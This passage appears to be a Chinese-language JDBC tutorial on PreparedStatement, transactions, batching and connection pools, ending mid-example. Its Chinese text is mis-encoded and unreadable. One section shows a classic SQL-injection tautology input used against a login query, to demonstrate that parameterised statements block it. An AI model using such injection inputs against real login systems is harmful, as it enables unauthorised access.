com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\nimport java.util.Scanner;\n\npublic class PreparedStatement_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        Scanner scanner = new Scanner(System.in);\n        //è®©ç”¨æˆ·è¾“å…¥ç®¡ç†å‘˜åå’Œå¯†ç \n        System.out.print(\"è¯·è¾“å…¥ç®¡ç†å‘˜çš„åå­—: \"); //next(): å½“æ¥æ”¶åˆ°ç©ºæ ¼æˆ–è€…'å°±æ˜¯è¡¨ç¤ºç»“æŸ\n        String admin_name = scanner.nextLine(); //å¦‚æœå¸Œæœ›çœ‹åˆ°SQLæ³¨å…¥ï¼Œè¿™é‡Œéœ€è¦ç”¨nextLine\n        System.out.print(\"è¯·è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç : \");\n        String admin_pwd = scanner.nextLine();\n        //é€šè¿‡Propertieså¯¹è±¡è·å–é…ç½®æ–‡ä»¶çš„ä¿¡æ¯\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //è·å–ç›¸å…³çš„å€¼\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. æ³¨å†Œé©±åŠ¨\n        Class.forName(driver);//å»ºè®®å†™ä¸Š\n        //2. å¾—åˆ°è¿æ¥\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. å¾—åˆ°PreparedStatement\n        //3.1 ç»„ç»‡SqL , Sql è¯­å¥çš„? å°±ç›¸å½“äºå ä½ç¬¦\n        String sql = \"select name , password from user where name = ? and password = ?\";\n        //3.2 preparedStatement å¯¹è±¡å®ç°äº†PreparedStatement æ¥å£çš„å®ç°ç±»çš„å¯¹è±¡\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //3.3 ç»™?èµ‹å€¼\n        preparedStatement.setString(1, admin_name);\n        preparedStatement.setString(2, admin_pwd);\n        //4. æ‰§è¡Œselect è¯­å¥ä½¿ç”¨executeQuery\n        // å¦‚æœæ‰§è¡Œçš„æ˜¯dml(update, insert ,delete)ä½¿ç”¨executeUpdate()\n        // è¿™é‡Œæ‰§è¡ŒexecuteQuery ,ä¸è¦åœ¨å†™sql\n        ResultSet resultSet = preparedStatement.executeQuery();\n        if (resultSet.next()) { //å¦‚æœæŸ¥è¯¢åˆ°ä¸€æ¡è®°å½•ï¼Œåˆ™è¯´æ˜è¯¥ç®¡ç†å­˜åœ¨\n            System.out.println(\"æ­å–œï¼Œ ç™»å½•æˆåŠŸ\");\n        } else {\n            System.out.println(\"å¯¹ä¸èµ·ï¼Œç™»å½•å¤±è´¥\");\n        }\n        //å…³é—­è¿æ¥\n        resultSet.close();\n        preparedStatement.close();\n        connection.close();\n    }\n}\n```\n\næ­£å¸¸ç™»é™†\n\n```bash\nè¯·è¾“å…¥ç®¡ç†å‘˜çš„åå­—: Tom\nè¯·è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç : 123\næ­å–œï¼Œ ç™»å½•æˆåŠŸ\n```\n\nSqlæ³¨å…¥ç™»é™†\n\n```bash\nè¯·è¾“å…¥ç®¡ç†å‘˜çš„åå­—: Tom' or\nè¯·è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç : or '1'='1\nå¯¹ä¸èµ·ï¼Œç™»å½•å¤±è´¥\n```\n\n#### æ‰§è¡Œæ›´æ–°\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\nimport java.util.Scanner;\n\npublic class PreparedStatement_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        Scanner scanner = new Scanner(System.in);\n        //è®©ç”¨æˆ·è¾“å…¥ç®¡ç†å‘˜åå’Œå¯†ç \n        System.out.print(\"è¯·è¾“å…¥ç®¡ç†å‘˜çš„åå­—: \"); //next(): å½“æ¥æ”¶åˆ°ç©ºæ ¼æˆ–è€…'å°±æ˜¯è¡¨ç¤ºç»“æŸ\n        String admin_name = scanner.nextLine(); //å¦‚æœå¸Œæœ›çœ‹åˆ°SQL æ³¨å…¥ï¼Œè¿™é‡Œéœ€è¦ç”¨nextLine\n        System.out.print(\"è¯·è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç : \");\n        String admin_pwd = scanner.nextLine();\n        //é€šè¿‡Properties å¯¹è±¡è·å–é…ç½®æ–‡ä»¶çš„ä¿¡æ¯\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //è·å–ç›¸å…³çš„å€¼\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. æ³¨å†Œé©±åŠ¨\n        Class.forName(driver);//å»ºè®®å†™ä¸Š\n        //2. å¾—åˆ°è¿æ¥\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. å¾—åˆ°PreparedStatement\n        //3.1 ç»„ç»‡SqL , Sql è¯­å¥çš„? å°±ç›¸å½“äºå ä½ç¬¦\n        String sql = \"insert into user values (?,?)\";\n        //3.2 preparedStatement å¯¹è±¡å®ç°äº†PreparedStatement æ¥å£çš„å®ç°ç±»çš„å¯¹è±¡\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //3.3 ç»™?èµ‹å€¼\n        preparedStatement.setString(1, admin_name);\n        preparedStatement.setString(2, admin_pwd);\n        //4. æ‰§è¡Œdml(update, insert ,delete),ä½¿ç”¨executeUpdate()\n        int rows = preparedStatement.executeUpdate();//ä¸è¦å†™sql\n        System.out.println(rows > 0 ? \"æ‰§è¡ŒæˆåŠŸ\" : \"æ‰§è¡Œå¤±è´¥\");\n        //å…³é—­è¿æ¥\n        preparedStatement.close();\n        connection.close();\n    }\n}\n```\n\n### 6.JDBC API\n\n#### DriverMangeré©±åŠ¨ç®¡ç†ç±»\n\n- getConnection(url, user,pwd) è·å–åˆ°è¿æ¥\n\n#### Connectionæ¥å£\n\n- createStatement() åˆ›å»ºStatementå¯¹è±¡\n- PreparedStatement(sql) ç”Ÿæˆé¢„å¤„ç†å¯¹è±¡\n\n#### Statementæ¥å£\n\n- executeUpdate(sql) æ‰§è¡Œdmlè¯­å¥ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•°\n- executeQurey(sql) æ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿”å›Resultsetå¯¹è±¡\n- execute(sql) æ‰§è¡Œä»»æ„sqlï¼Œè¿”å›å¸ƒå°”å€¼\n\n#### PreparedStatementæ¥å£\n\n- executeUpdate() æ‰§è¡Œdmlè¯­å¥ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•°\n- executeQurey() æ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿”å›Resultsetå¯¹è±¡\n- execute() æ‰§è¡Œä»»æ„sqlï¼Œè¿”å›å¸ƒå°”å€¼\n- setXxx(å ä½ç¬¦ç´¢å¼•ï¼Œå ä½ç¬¦çš„å€¼) å°†å€¼ç»‘å®šåˆ°å‚æ•°ï¼Œè§£å†³sqlæ³¨å…¥\n- setObjectå ä½ç¬¦ç´¢å¼•ï¼Œå ä½ç¬¦çš„å€¼)\n\n#### ResultSet ç»“æœé›†\n\n- next() å‘ä¸‹ç§»åŠ¨ä¸€è¡Œï¼Œå¦‚æœæ²¡æœ‰ä¸‹ä¸€è¡Œè¿”å›false\n- Previous() å‘ä¸Šç§»åŠ¨ä¸€è¡Œ\n- getXxx(åˆ—çš„ç´¢å¼•ï½œåˆ—å) è¿”å›å¯¹åº”åˆ—çš„å€¼ï¼Œæ¥æ”¶ç±»å‹ä¸ºXxx\n- getObject(åˆ—çš„ç´¢å¼•ï½œåˆ—å) è¿”å›å¯¹åº”åˆ—çš„å€¼ï¼Œæ¥æ”¶ç±»å‹ä¸ºObject\n\n### 7.å°è£…JDBCUtils\n\n#### ä»£ç å®ç°\n\nåœ¨JDBCæ“ä½œæ—¶ï¼Œ**è·å–è¿æ¥**å’Œ**é‡Šæ”¾è¿æ¥**ä¼šç»å¸¸ä½¿ç”¨ï¼Œå¯ä»¥å°†å…¶å°è£…åˆ°JDBCè¿æ¥çš„å·¥å…·ç±»JDBCUtils\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\n\npublic class JDBCUtils {\n    //å®šä¹‰ç›¸å…³çš„å±æ€§(4 ä¸ª), å› ä¸ºåªéœ€è¦ä¸€ä»½ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åšå‡ºstatic\n    private static String user; //ç”¨æˆ·å\n    private static String password; //å¯†ç \n    private static String url; //url\n    private static String driver; //é©±åŠ¨å\n\n    //åœ¨static ä»£ç å—å»åˆå§‹åŒ–\n    static {\n        try {\n            Properties properties = new Properties();\n            properties.load(new FileInputStream(\"src//mysql.properties\"));\n            //è¯»å–ç›¸å…³çš„å±æ€§å€¼\n            user = properties.getProperty(\"user\");\n            password = properties.getProperty(\"password\");\n            url = properties.getProperty(\"url\");\n            driver = properties.getProperty(\"driver\");\n        } catch (IOException e) {\n            //åœ¨å®é™…å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å¤„ç†\n            //1. å°†ç¼–è¯‘å¼‚å¸¸è½¬æˆè¿è¡Œå¼‚å¸¸\n            //2. è°ƒç”¨è€…ï¼Œå¯ä»¥é€‰æ‹©æ•è·è¯¥å¼‚å¸¸ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©é»˜è®¤å¤„ç†è¯¥å¼‚å¸¸ï¼Œæ¯”è¾ƒæ–¹ä¾¿.\n            throw new RuntimeException(e);\n        }\n    }\n\n    //è¿æ¥æ•°æ®åº“, è¿”å›Connection\n    public static Connection getConnection() {\n        try {\n            return DriverManager.getConnection(url, user, password);\n        } catch (SQLException e) {\n            //1. å°†ç¼–è¯‘å¼‚å¸¸è½¬æˆè¿è¡Œå¼‚å¸¸\n            //2. è°ƒç”¨è€…ï¼Œå¯ä»¥é€‰æ‹©æ•è·è¯¥å¼‚å¸¸ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©é»˜è®¤å¤„ç†è¯¥å¼‚å¸¸ï¼Œæ¯”è¾ƒæ–¹ä¾¿.\n            throw new RuntimeException(e);\n        }\n    }\n\n    //å…³é—­ç›¸å…³èµ„æº\n    /*\n    1. ResultSet ç»“æœé›†\n    2. Statement æˆ–è€… PreparedStatement\n    3. Connection\n    4. å¦‚æœéœ€è¦å…³é—­èµ„æºï¼Œå°±ä¼ å…¥å¯¹è±¡ï¼Œå¦åˆ™ä¼ å…¥null\n    */\n    public static void close(ResultSet set, Statement statement, Connection connection) {\n        //åˆ¤æ–­æ˜¯å¦ä¸ºnull\n        try {\n            if (set != null) {\n                set.close();\n            }\n            if (statement != null) {\n                statement.close();\n            }\n            if (connection != null) {\n                connection.close();\n            }\n        } catch (SQLException e) {\n            //å°†ç¼–è¯‘å¼‚å¸¸è½¬æˆè¿è¡Œå¼‚å¸¸æŠ›å‡º\n            throw new RuntimeException(e);\n        }\n    }\n\n}\n```\n\n#### ä½¿ç”¨å·¥å…·ç±»JDBCUtilsè¿›è¡ŒDML\n\n```java\npackage com.jwt.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCUtils_Use {\n    @Test\n    public void testDML() {//insert , update, delete\n        //1. å¾—åˆ°è¿æ¥\n        Connection connection = null;\n        //2. ç»„ç»‡ä¸€ä¸ªsql\n        String sql = \"update user set name = ? where id = ?\";\n        PreparedStatement preparedStatement = null;\n        //3. åˆ›å»ºPreparedStatement å¯¹è±¡\n        try {\n            connection = JDBCUtils.getConnection();\n            preparedStatement = connection.prepareStatement(sql);\n            //ç»™å ä½ç¬¦èµ‹å€¼\n            preparedStatement.setString(1, \"Bob\");\n            preparedStatement.setInt(2, 1);\n            //æ‰§è¡Œ\n            preparedStatement.executeUpdate();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //å…³é—­èµ„æº\n            JDBCUtils.close(null, preparedStatement, connection);\n        }\n    }\n}\n\n```\n\n#### ä½¿ç”¨å·¥å…·ç±»JDBCUtilsè¿›è¡ŒQuery\n\n```java\npackage com.jwt.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCUtils_Use {\n    @Test\n    public void testSelect() throws SQLException {\n        //1. å¾—åˆ°è¿æ¥\n        Connection connection = null;\n        //2. ç»„ç»‡ä¸€ä¸ªsql\n        String sql = \"select * from user where id = ?\";\n        PreparedStatement preparedStatement = null;\n        ResultSet set = null;\n        //3. åˆ›å»ºPreparedStatement å¯¹è±¡\n        try {\n            connection = JDBCUtils.getConnection();\n//            System.out.println(connection.getClass()); //com.mysql.jdbc.JDBC4Connection\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.setInt(1, 1);//ç»™?å·èµ‹å€¼\n            //æ‰§è¡Œ, å¾—åˆ°ç»“æœé›†\n            set = preparedStatement.executeQuery();\n            //éå†è¯¥ç»“æœé›†\n            while (set.next()) {\n                int id = set.getInt(\"id\");\n                String name = set.getString(\"name\");\n                String password = set.getString(\"password\");\n                Date birthday = set.getDate(\"birthday\");\n                System.out.println(id + \"\\t\" + name + \"\\t\"  + password + \"\\t\" + birthday);\n            }\n        }catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //å…³é—­èµ„æº\n            JDBCUtils.close(set, preparedStatement, connection);\n        }\n    }\n}\n```\n\n### 8.äº‹åŠ¡\n\n1. JDBC ç¨‹åºä¸­å½“ä¸€ä¸ª Connection å¯¹è±¡åˆ›å»ºæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯**è‡ªåŠ¨æäº¤äº‹åŠ¡**:æ¯æ¬¡æ‰§è¡Œä¸€ä¸ª SQL è¯­å¥æ—¶ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œå°±ä¼šå‘æ•°æ®åº“**è‡ªåŠ¨æäº¤**ï¼Œè€Œä¸èƒ½å›æ»šã€‚\n2. JDBC ç¨‹åºä¸­ä¸ºäº†è®©å¤šä¸ª SQL è¯­å¥ä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œï¼Œéœ€è¦ä½¿ç”¨äº‹åŠ¡\n3. è°ƒç”¨ Connection çš„ setAutoCommit(false) å¯ä»¥å–æ¶ˆè‡ªåŠ¨æäº¤äº‹åŠ¡\n4. åœ¨æ‰€æœ‰çš„ SQL è¯­è¯¢éƒ½æˆåŠŸæ‰§è¡Œåï¼Œè°ƒç”¨ Connection çš„ commit(); æ–¹æ³•æäº¤äº‹åŠ¡\n5. åœ¨å…¶ä¸­æŸä¸ªæ“ä½œå¤±è´¥æˆ–å‡ºç°å¼‚å¸¸æ—¶ï¼Œ è°ƒç”¨ Connection çš„ rolback(); æ–¹æ³•å›æ»šäº‹åŠ¡\n\n#### æ¨¡æ‹Ÿç»å…¸çš„è½¬è´¦ä¸šåŠ¡\n\n```sql\ncreate table account(\n  id int primary key auto_ increment,\n  name varchar(32) not null default '',\n  balance double not null default 0) character set utf8;\n  \ninsert into account values(null, 'é©¬äº‘', 3000);\ninsert into account values(null, 'é©¬åŒ–è…¾', 10000);\n```\n\n\n\n```java\npackage com.jwt.jdbc.transaction_;\n\nimport com.jwt.jdbc.JDBCUtils;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\n\npublic class Transaction_ {\n\n    //æ²¡æœ‰ä½¿ç”¨äº‹åŠ¡ï¼Œ100ä¼šå‡­ç©ºæ¶ˆå¤±\n    @Test\n    public void noTransaction(){\n        //1. å¾—åˆ°è¿æ¥\n        Connection connection = null;\n        //2. ç»„ç»‡ä¸€ä¸ªsql\n        String sql = \"update account set balance = balance - 100 where id = 1\";\n        String sql2 = \"update account set balance = balance + 100 where id = 2\";\n        PreparedStatement preparedStatement = null;\n        //3. åˆ›å»ºPreparedStatement å¯¹è±¡\n        try {\n            connection = JDBCUtils.getConnection();// åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œconnection æ˜¯é»˜è®¤è‡ªåŠ¨æäº¤\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.executeUpdate();// æ‰§è¡Œç¬¬1æ¡sql\n\n            int i = 1 / 0; //æŠ›å‡ºå¼‚å¸¸\n            preparedStatement = connection.prepareStatement(sql2);\n            preparedStatement.executeUpdate(); // æ‰§è¡Œç¬¬2æ¡sql\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //å…³é—­èµ„æº\n            JDBCUtils.close(null, preparedStatement, connection);\n        }\n    }\n\n    //äº‹åŠ¡æ¥è§£å†³\n    @Test\n    public void useTransaction() {\n        //1. å¾—åˆ°è¿æ¥\n        Connection connection = null;\n        //2. ç»„ç»‡ä¸€ä¸ªsql\n        String sql = \"update account set balance = balance - 100 where id = 1\";\n        String sql2 = \"update account set balance = balance + 100 where id = 2\";\n        PreparedStatement preparedStatement = null;\n        //3. åˆ›å»ºPreparedStatement å¯¹è±¡\n        try {\n            connection = JDBCUtils.getConnection();// åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œconnection æ˜¯é»˜è®¤è‡ªåŠ¨æäº¤\n            //å°†connection è®¾ç½®ä¸ºä¸è‡ªåŠ¨æäº¤\n            connection.setAutoCommit(false); //å¼€å¯äº†äº‹åŠ¡\n\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.executeUpdate();// æ‰§è¡Œç¬¬1æ¡sql\n\n//            int i = 1 / 0; //æŠ›å‡ºå¼‚å¸¸\n            preparedStatement = connection.prepareStatement(sql2);\n            preparedStatement.executeUpdate(); // æ‰§è¡Œç¬¬2æ¡sql\n\n            connection.commit();\n\n        } catch (SQLException e) {\n\n            try {\n                //è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå›æ»šï¼Œå³æ’¤é”€æ‰§è¡Œçš„SQL\n                //é»˜è®¤å›æ»šåˆ°äº‹åŠ¡å¼€å§‹çš„çŠ¶æ€.\n                System.out.println(\"æ‰§è¡Œå‘ç”Ÿäº†å¼‚å¸¸ï¼Œæ’¤é”€æ‰§è¡Œçš„sql\");\n                connection.rollback();\n            } catch (SQLException ex) {\n                ex.printStackTrace();\n            }\n            e.printStackTrace();\n        } finally {\n            //å…³é—­èµ„æº\n            JDBCUtils.close(null, preparedStatement, connection);\n        }\n\n    }\n\n}\n```\n\n### 9.æ‰¹å¤„ç†\n\nåŸºæœ¬ä»‹ç»\n1ã€å½“éœ€è¦æˆæ‰¹æ’å…¥æˆ–è€…æ›´æ–°è®°å½•æ—¶ã€‚ å¯ä»¥é‡‡ç”¨Javaçš„æ‰¹é‡æ›´æ–°æœºåˆ¶ï¼Œè¿™ä¸€æœºåˆ¶å…è®¸å¤šæ¡è¯­å¥ä¸€æ¬¡æ€§æäº¤ç»™æ•°æ®åº“æ‰¹é‡å¤„ç†ã€‚é€šå¸¸æƒ…å†µä¸‹æ¯”å•ç‹¬æäº¤å¤„ç†æ›´æœ‰æ•ˆç‡ã€‚\n2ã€JDBCçš„æ‰¹é‡å¤„ç†è¯­å¥åŒ…æ‹¬ä¸‹é¢æ–¹æ³•:\n\n- addBatch():æ·»åŠ éœ€è¦æ‰¹é‡å¤„ç†çš„SQLè¯­åŒ…æˆ–å‚æ•°\n- executeBatch():æ‰§è¡Œæ‰¹é‡å¤„ç†è¯­å¥\n- clearBatch():æ¸…ç©ºæ‰¹å¤„ç†åŒ…çš„è¯­å¥\n\n3ã€JDBCè¿æ¥MySQLæ—¶ï¼Œ å¦‚æœè¦ä½¿ç”¨æ‰¹å¤„ç†åŠŸèƒ½ï¼Œè¯·å†urlä¸­åŠ å‚æ•°**?rewriteBatchedStatements=true**\n\n4ã€æ‰¹å¤„ç†å¾€å¾€å’ŒPreparedStatementä¸€æ­é…ä½¿ç”¨ï¼Œå¯ä»¥æ—¢å‡å°‘ç¼–è¯‘æ¬¡æ•°ï¼Œåˆå‡å°‘è¿è¡Œæ¬¡æ•°ï¼Œæ•ˆç‡å¤§å¤§æé«˜\n\n```java\npackage com.jwt.jdbc;\n\nimport org.junit.Test;\n\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.util.Properties;\n\npublic class Batch_ {\n    //ä¼ ç»Ÿæ–¹æ³•ï¼Œæ·»åŠ 5000 æ¡æ•°æ®åˆ°admin2\n    @Test\n    public void noBatch() throws Exception {\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));//windowsè·¯å¾„çš„//æ”¹æˆ\\\\\n        //è·å–ç›¸å…³çš„å€¼\n        String url = properties.getProperty(\"url\");\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        Connection connection = DriverManager.getConnection(url,user,password);\n        String sql = \"insert into jwt_info values(?, ?)\";\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        System.out.println(\"å¼€å§‹æ‰§è¡Œ\");\n        long start = System.currentTimeMillis();//å¼€å§‹æ—¶é—´\n        for (int i = 0; i < 5000; i++) {//5000 æ‰§è¡Œ\n            preparedStatement.setInt(1, i);\n            preparedStatement.setString(2, \"jack\" + i);\n            preparedStatement.executeUpdate();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"ä¼ ç»Ÿçš„æ–¹å¼è€—æ—¶=\" + (end - start) + \"ms\") ;//ä¼ ç»Ÿçš„æ–¹å¼è€—æ—¶=385ms\n        //å…³é—­è¿æ¥\n        preparedStatement.close();\n        connection.close();\n    }\n\n    //ä½¿ç”¨æ‰¹é‡æ–¹å¼æ·»åŠ æ•°æ®\n    @Test\n    public void batch() throws Exception {\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));//windowsè·¯å¾„çš„//æ”¹æˆ\\\\\n        //è·å–ç›¸å…³çš„å€¼\n        String url = properties.getProperty(\"url\");\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        Connection connection = DriverManager.getConnection(url,user,password);\n        String sql = \"insert into jwt_info values(?, ?)\";\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        System.out.println(\"å¼€å§‹æ‰§è¡Œ\");\n        long start = System.currentTimeMillis();//å¼€å§‹æ—¶é—´\n        for (int i = 0; i < 5000; i++) {//5000 æ‰§è¡Œ\n            preparedStatement.setInt(1, i);\n            preparedStatement.setString(2, \"jack\" + i);\n            preparedStatement.addBatch();\n            //å½“æœ‰1000 æ¡è®°å½•æ—¶ï¼Œåœ¨æ‰¹é‡æ‰§è¡Œ\n            if((i + 1) % 1000 == 0) {//æ»¡1000 æ¡sql\n                preparedStatement.executeBatch();\n                //æ¸…ç©ºä¸€æŠŠ\n                preparedStatement.clearBatch();\n            }\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"æ‰¹é‡æ–¹å¼è€—æ—¶=\" + (end - start) + \"ms\");//æ‰¹é‡æ–¹å¼è€—æ—¶=60ms\n        //å…³é—­è¿æ¥\n        preparedStatement.close();\n        connection.close();\n        }\n}\n```\n\n### 10.æ•°æ®åº“è¿æ¥æ± \n\n#### ä¼ ç»Ÿè¿æ¥å¼Šç«¯\n\n- 1.ä¼ ç»Ÿçš„ JDBC æ•°æ®åº“è¿æ¥ä½¿ç”¨ DriverManager æ¥è·å–ï¼Œæ¯æ¬¡å‘æ•°æ®åº“å»ºç«‹è¿æ¥çš„æ—¶å€™éƒ½è¦å°† Connection åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå†éªŒè¯ IP åœ°å€ï¼Œç”¨æˆ·åå’Œå¯†ç  (0.05s ~ 1sæ—¶é—´)ã€‚éœ€è¦æ•°æ®åº“è¿æ¥çš„æ—¶å€™ï¼Œå°±å‘æ•°æ®åº“è¦æ±‚ä¸€ä¸ªï¼Œé¢‘ç¹çš„è¿›è¡Œæ•°æ®åº“è¿æ¥æ“ä½œå°†å ç”¨å¾ˆå¤šçš„ç³»ç»Ÿèµ„æºï¼Œå®¹æ˜“é€ æˆæœåŠ¡å™¨å´©æºƒã€‚\n- 2.æ¯æ¬¡æ•°æ®åº“è¿æ¥ï¼Œä½¿ç”¨å®Œåéƒ½å¾—æ–­å¼€ï¼Œå¦‚æœç¨‹åºå‡ºç°å¼‚å¸¸è€Œæœªèƒ½å…³é—­ï¼Œå°†å¯¼è‡´æ•°æ®åº“å†…å­˜æ³„æ¼ï¼Œæœ€ç»ˆå°†å¯¼è‡´é‡å¯æ•°æ®åº“ã€‚\n- 3.ä¼ ç»Ÿè·å–è¿æ¥çš„æ–¹å¼ï¼Œä¸èƒ½æ§åˆ¶åˆ›å»ºçš„è¿æ¥æ•°é‡ï¼Œå¦‚è¿æ¥è¿‡å¤šï¼Œä¹Ÿå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ï¼ŒMySQLå´©æºƒã€‚\n\nä¸ºäº†è§£å†³ä¼ ç»Ÿå¼€å‘ä¸­çš„æ•°æ®åº“è¿æ¥é—®é¢˜ï¼Œå¯ä»¥é‡‡ç”¨æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯(connection pool)\n\n#### è¿æ¥æ± ä»‹ç»\n\n- 1.é¢„å…ˆåœ¨ç¼“å†²æ± ä¸­æ”¾å…¥ä¸€å®šæ•°é‡çš„è¿æ¥ï¼Œ å½“éœ€è¦å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶ï¼Œåªéœ€ä»â€œç¼“å†²æ± â€ä¸­å–å‡ºä¸€ä¸ªï¼Œä½¿ç”¨å®Œæ¯•ä¹‹åå†æ”¾å›å»ã€‚\n- 2.æ•°æ®åº“è¿æ¥æ± è´Ÿè´£åˆ†é…ã€ç®¡ç†å’Œé‡Šæ”¾æ•°æ®åº“è¿æ¥ï¼Œå®ƒå…è®¸åº”ç”¨ç¨‹åºé‡å¤ä½¿ç”¨ä¸€ä¸ªç°æœ‰çš„æ•°æ®åº“è¿æ¥ï¼Œè€Œä¸æ˜¯é‡æ–°å»ºç«‹ä¸€ä¸ªã€‚\n- 3.å½“åº”ç”¨ç¨‹åºå‘è¿æ¥æ± è¯·æ±‚çš„è¿æ¥æ•°è¶…è¿‡æœ€å¤§è¿æ¥æ•°é‡æ—¶ï¼Œè¿™äº›è¯·æ±‚å°†è¢«åŠ å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­\n\n![](https://img.jwt1399.top/img/image-20220220161330174.png)\n\n#### è¿æ¥æ± ç§ç±»\n\n- 1.JDBC çš„æ•°æ®åº“è¿æ¥æ± ä½¿ç”¨ javax.sql.DataSourceæ¥è¡¨ç¤ºï¼ŒDataSourceåªæ˜¯ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£é€šå¸¸ç”±ç¬¬ä¸‰æ–¹æä¾›å®ç°\n- 2.C3P0æ•°æ®åº“è¿æ¥æ± ï¼Œé€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ï¼Œç¨³å®šæ€§ä¸é”™ã€‚\n- 3.DBCPæ•°æ®åº“è¿æ¥æ± ï¼Œ é€Ÿåº¦ç›¸å¯¹C3P0è¾ƒå¿«ï¼Œä½†ä¸ç¨³å®šã€‚\n- 4.Proxoolæ•°æ®åº“è¿æ¥æ± ï¼Œæœ‰ç›‘æ§è¿æ¥æ± çŠ¶æ€çš„åŠŸèƒ½ï¼Œç¨³å®šæ€§è¾ƒc3p0å·®ä¸€ç‚¹ã€‚\n- 5.BoneCPæ•°æ®åº“è¿æ¥æ± ï¼Œé€Ÿåº¦å¿«ã€‚\n- 6.Druid(å¾·é²ä¼Š)æ˜¯é˜¿é‡Œæä¾›çš„æ•°æ®åº“è¿æ¥æ± ï¼Œé›†DBCPã€C3PO ã€Proxoolä¼˜ç‚¹äºä¸€èº«çš„æ•°æ®åº“è¿æ¥æ± ã€‚\n\n#### C3P0\n\n##### å‡†å¤‡å·¥ä½œ\n\næ–¹å¼ä¸€å’ŒäºŒéƒ½éœ€è¦ï¼š\n\nå°†ä¸‹è½½çš„ c3p0.jar é©±åŠ¨æ‹·è´åˆ° libs ç›®å½•ä¸‹ï¼Œåœ¨ IDEA ä¸­å³é”®ç‚¹å‡» c3p0.jar é€‰æ‹© add to Library (åŠ å…¥åˆ°é¡¹ç›®ä¸­)\n\næ–¹å¼äºŒè¿˜éœ€è¦ï¼š\n\nå°†c3p0æä¾›çš„ c3p0.config.xml æ‹·è´åˆ° src ç›®å½•ä¸‹ï¼Œè¯¥æ–‡ä»¶æŒ‡å®šäº†è¿æ¥æ•°æ®åº“å’Œè¿æ¥æ± çš„ç›¸å…³å‚æ•°\n\n##### æ–¹å¼ä¸€\n\nåœ¨ç¨‹åºä¸­æŒ‡å®š user, url , password ç­‰ç›¸å…³å‚æ•°æ¥å®Œæˆ\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.mchange.v2.c3p0.ComboPooledDataSource;\nimport org.junit.Test;\n\nimport java.beans.PropertyVetoException;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.Properties;\n\n\npublic class C3P0_ {\n\n    //æ–¹å¼1ï¼šåœ¨ç¨‹åºä¸­æŒ‡å®š user, url , password ç­‰ç›¸å…³å‚æ•°\n    @Test\n    public void testC3P0_01() throws IOException, PropertyVetoException, SQLException 